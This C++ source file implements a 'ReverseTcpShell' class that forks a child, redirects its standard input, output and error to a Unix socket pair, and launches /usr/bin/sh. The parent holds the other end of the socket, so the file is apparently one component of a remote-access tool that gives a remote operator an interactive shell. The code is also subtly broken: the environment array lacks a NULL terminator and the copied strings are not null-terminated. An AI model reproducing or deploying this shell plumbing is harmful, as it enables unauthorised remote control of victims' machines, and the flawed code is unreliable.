#include "ReverseTcpShell.h"

#include <fcntl.h>

#include <sys/wait.h>

#define DEFAULT_SHELL "/usr/bin/sh"

#define SHELL_ENV "SHELL=" DEFAULT_SHELL
#define PATH_ENV "PATH=/usr/bin:/usr/sbin"

namespace Task
{

ReverseTcpShell::ReverseTcpShell(asio::io_context &ioContext) :
    m_parentSocket(ioContext),
    m_childSocket(ioContext),
    m_shellPid(-1)
{
    asio::local::connect_pair(m_parentSocket, m_childSocket);
}

ReverseTcpShell::~ReverseTcpShell()
{
    //! Cancel all io operations for the Unix sockets.
    m_parentSocket.cancel();
    m_childSocket.cancel();

    if (m_shellPid != -1)
        kill(m_shellPid, SIGKILL);
}

bool ReverseTcpShell::Start()
{
    const size_t pid = fork(); 
    if (0 == pid)
    {
        //! Child.

        //! Dup2 used to close original standard IO file handles
        //! and redirect them to the child socket.
        dup2(m_childSocket.native_handle(), STDIN_FILENO);
        dup2(m_childSocket.native_handle(), STDOUT_FILENO);
        dup2(m_childSocket.native_handle(), STDERR_FILENO);

        //! Initialize the shell variables.
        std::vector<char> shellEnv;
        std::vector<char> pathEnv;

        std::copy(SHELL_ENV, SHELL_ENV + strlen(SHELL_ENV), std::back_inserter(shellEnv));
        std::copy(PATH_ENV, PATH_ENV + strlen(PATH_ENV), std::back_inserter(pathEnv));

        char* env[] = { shellEnv.data(), pathEnv.data() };
        char* shell[] = { DEFAULT_SHELL, NULL };

        //! Execve to load the shell process and execute it.
        const int result = execve(shell[0], shell, env);
        if (-1 == result)
            exit(1);
    }
    else
    {
        //! Parent.
        m_shellPid = pid;
    }

    return true;
}

ReverseTcpShell::UnixSocket &ReverseTcpShell::GetParentSocket()
{
    return m_parentSocket;
}

pid_t ReverseTcpShell::GetShellPid() const
{
    return m_shellPid;
}

bool ReverseTcpShell::HasShellTerminated() const
{
    int status;
    const pid_t result = waitpid(GetShellPid(), &status, WNOHANG);

    return (GetShellPid() == result);
}

} // namespace Task
